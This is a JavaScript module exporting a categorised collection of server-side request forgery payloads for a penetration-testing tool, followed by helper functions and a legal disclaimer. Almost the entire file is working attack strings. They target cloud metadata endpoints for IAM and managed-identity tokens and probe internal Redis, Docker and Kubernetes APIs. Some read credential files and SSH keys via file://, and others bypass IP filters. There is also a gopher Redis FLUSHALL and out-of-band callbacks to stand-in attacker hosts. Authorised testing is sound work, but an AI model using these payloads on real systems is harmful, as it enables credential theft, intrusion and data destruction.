// SSRF (Server-Side Request Forgery) Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const ssrfPayloads = {
  cloudMetadata: {
    name: 'Cloud Metadata Services',
    description: 'Cloud provider instance metadata endpoints',
    category: 'Cloud Metadata',
    payloads: [
      {
        name: 'AWS IMDSv1 - Credentials',
        code: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
      },
      {
        name: 'AWS IMDSv1 - User Data',
        code: 'http://169.254.169.254/latest/user-data'
      },
      {
        name: 'AWS IMDSv1 - Hostname',
        code: 'http://169.254.169.254/latest/meta-data/hostname'
      },
      {
        name: 'AWS IMDSv2 - Token Request (Step 1)',
        code: 'PUT http://169.254.169.254/latest/api/token\nX-aws-ec2-metadata-token-ttl-seconds: 21600'
      },
      {
        name: 'AWS IMDSv2 - Use Token (Step 2)',
        code: 'http://169.254.169.254/latest/meta-data/\n[Use header: X-aws-ec2-metadata-token: <TOKEN>]'
      },
      {
        name: 'GCP Metadata - Service Account Token',
        code: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n[Use header: Metadata-Flavor: Google]'
      },
      {
        name: 'GCP Metadata - Project ID',
        code: 'http://metadata.google.internal/computeMetadata/v1/project/project-id\n[Use header: Metadata-Flavor: Google]'
      },
      {
        name: 'Azure Instance Metadata',
        code: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01\n[Use header: Metadata: true]'
      },
      {
        name: 'Azure - Managed Identity Token',
        code: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n[Use header: Metadata: true]'
      }
    ]
  },
  internalServices: {
    name: 'Internal Services',
    description: 'Common internal service endpoints',
    category: 'Internal Services',
    payloads: [
      {
        name: 'Redis - Info',
        code: 'http://127.0.0.1:6379/\n[Note: Use Gopher protocol for full Redis interaction]'
      },
      {
        name: 'Elasticsearch - Cluster Info',
        code: 'http://127.0.0.1:9200/'
      },
      {
        name: 'Elasticsearch - All Indices',
        code: 'http://127.0.0.1:9200/_cat/indices'
      },
      {
        name: 'Docker API - Containers',
        code: 'http://127.0.0.1:2375/v1.41/containers/json'
      },
      {
        name: 'Docker API - Info',
        code: 'http://127.0.0.1:2375/info'
      },
      {
        name: 'Kubernetes API Server',
        code: 'https://10.0.0.1:443/api/v1/namespaces'
      },
      {
        name: 'Kubernetes - Pods',
        code: 'https://10.0.0.1:443/api/v1/pods'
      },
      {
        name: 'localhost HTTP',
        code: 'http://localhost/'
      },
      {
        name: 'localhost HTTPS',
        code: 'https://localhost/'
      },
      {
        name: 'Internal network scan (example)',
        code: 'http://192.168.1.1/'
      }
    ]
  },
  fileRead: {
    name: 'File Read via file://',
    description: 'Read local files using the file:// protocol',
    category: 'File Read',
    payloads: [
      {
        name: '/etc/passwd (Linux)',
        code: 'file:///etc/passwd'
      },
      {
        name: '/etc/hosts (Linux)',
        code: 'file:///etc/hosts'
      },
      {
        name: '/proc/self/environ (Linux)',
        code: 'file:///proc/self/environ'
      },
      {
        name: '/proc/self/cmdline (Linux)',
        code: 'file:///proc/self/cmdline'
      },
      {
        name: 'Windows hosts file',
        code: 'file:///C:/Windows/System32/drivers/etc/hosts'
      },
      {
        name: 'Windows SAM database',
        code: 'file:///C:/Windows/System32/config/SAM'
      },
      {
        name: 'AWS credentials',
        code: 'file:///home/ubuntu/.aws/credentials'
      },
      {
        name: 'SSH private key',
        code: 'file:///root/.ssh/id_rsa'
      }
    ]
  },
  ipBypass: {
    name: 'IP Encoding Bypasses',
    description: 'Bypass IP-based SSRF filters using alternative representations',
    category: 'IP Bypasses',
    payloads: [
      {
        name: 'Decimal IP (127.0.0.1 → 2130706433)',
        code: 'http://2130706433/'
      },
      {
        name: 'Hex IP (127.0.0.1 → 0x7f000001)',
        code: 'http://0x7f000001/'
      },
      {
        name: 'Octal IP (127.0.0.1 → 0177.0000.0000.0001)',
        code: 'http://0177.0000.0000.0001/'
      },
      {
        name: 'IPv6 Loopback',
        code: 'http://[::1]/'
      },
      {
        name: 'IPv6 Mapped IPv4',
        code: 'http://[::ffff:127.0.0.1]/'
      },
      {
        name: 'Mixed encoding (0x7f.0.0.1)',
        code: 'http://0x7f.0.0.1/'
      },
      {
        name: 'DNS rebinding domain (example)',
        code: 'http://spoofed.attacker.com/  [Setup DNS to resolve to 127.0.0.1]'
      },
      {
        name: 'URL with credentials (bypass)',
        code: 'http://expected.com@127.0.0.1/'
      },
      {
        name: 'Double URL-encoded',
        code: 'http://%31%32%37%2e%30%2e%30%2e%31/'
      }
    ]
  },
  protocols: {
    name: 'Protocol Schemes',
    description: 'Non-HTTP protocol schemes for SSRF attacks',
    category: 'Protocols',
    payloads: [
      {
        name: 'Gopher - Redis FLUSHALL',
        code: 'gopher://127.0.0.1:6379/_FLUSH%20ALL%0D%0A'
      },
      {
        name: 'Gopher - HTTP request',
        code: 'gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost%3A%20localhost%0D%0A%0D%0A'
      },
      {
        name: 'DICT - Server info',
        code: 'dict://127.0.0.1:11211/stat'
      },
      {
        name: 'LDAP - Null base query',
        code: 'ldap://127.0.0.1:389/%0a'
      },
      {
        name: 'FTP - Bounce scan',
        code: 'ftp://attacker.com:21/'
      },
      {
        name: 'SFTP - Internal host',
        code: 'sftp://127.0.0.1:22/'
      }
    ]
  },
  dnsOob: {
    name: 'DNS / OOB Probes',
    description: 'Out-of-band DNS-based detection payloads',
    category: 'DNS / OOB',
    payloads: [
      {
        name: 'Basic DNS lookup (Burp Collaborator)',
        code: 'http://{CALLBACK_HOST}/'
      },
      {
        name: 'DNS rebinding with subdomain',
        code: 'http://169.254.169.254.{CALLBACK_HOST}/'
      },
      {
        name: 'HTTP via DNS OOB',
        code: 'http://{CALLBACK_HOST}/path?data=exfil'
      },
      {
        name: 'HTTPS OOB',
        code: 'https://{CALLBACK_HOST}/'
      }
    ]
  }
}

export const getAllCategories = () => {
  const categories = new Set()
  Object.values(ssrfPayloads).forEach(group => categories.add(group.category))
  return Array.from(categories)
}

export const getPayloadsByCategory = (category) => {
  return Object.entries(ssrfPayloads).filter(([, group]) => group.category === category)
}

export const disclaimer = `
⚠️  DISCLAIMER & LEGAL NOTICE ⚠️

This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.

SSRF (Server-Side Request Forgery) vulnerabilities allow attackers to make the server perform requests on their behalf. Only use this tool if you:
✓ Have explicit written authorization from the system owner
✓ Are testing your own systems or systems you own
✓ Are in an authorized penetration testing engagement
✓ Understand the legal implications in your jurisdiction

Unauthorized use against systems you do not own is ILLEGAL.
`
